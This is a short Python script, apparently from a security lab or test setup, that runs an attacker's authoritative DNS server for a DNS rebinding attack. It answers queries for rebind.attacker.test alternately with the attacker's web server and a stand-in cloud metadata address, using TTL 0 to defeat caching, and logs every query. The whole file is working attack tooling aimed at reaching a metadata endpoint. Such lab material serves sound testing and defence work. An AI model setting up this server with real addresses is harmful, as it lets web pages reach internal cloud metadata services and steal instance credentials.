"""The attacker's authoritative server for attacker.test. (rebinding run). rebind.attacker.test. answers A queries
alternately with the attacker's own web server (10.53.0.66) and the stand-in for the cloud metadata address
(10.53.0.99), always with TTL 0 so no cache keeps either answer. Logs every query to stdout."""
import socket, time
import dns.flags, dns.message, dns.rcode, dns.rdatatype, dns.rrset

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(("0.0.0.0", 53))
n = 0
while True:
    data, addr = s.recvfrom(4096)
    q = dns.message.from_wire(data); qq = q.question[0]
    r = dns.message.make_response(q); r.flags |= dns.flags.AA
    name, typ = qq.name.to_text().lower(), dns.rdatatype.to_text(qq.rdtype)
    ans = "-"
    if name == "rebind.attacker.test." and typ == "A":
        ans = ["10.53.0.66", "10.53.0.99"][n % 2]; n += 1
        r.answer.append(dns.rrset.from_text(name, 0, "IN", "A", ans))
    elif name == "attacker.test." and typ in ("SOA", "NS"):
        r.answer.append(dns.rrset.from_text(name, 60, "IN", typ, "ns1.attacker.test." if typ == "NS" else "ns1.attacker.test. x.attacker.test. 1 60 60 60 0"))
    elif name != "rebind.attacker.test.":
        r.set_rcode(dns.rcode.NXDOMAIN)
    print(f"{time.time():.4f} {addr[0]} {typ} {name} -> {ans} ttl 0", flush=True)
    s.sendto(r.to_wire(), addr)
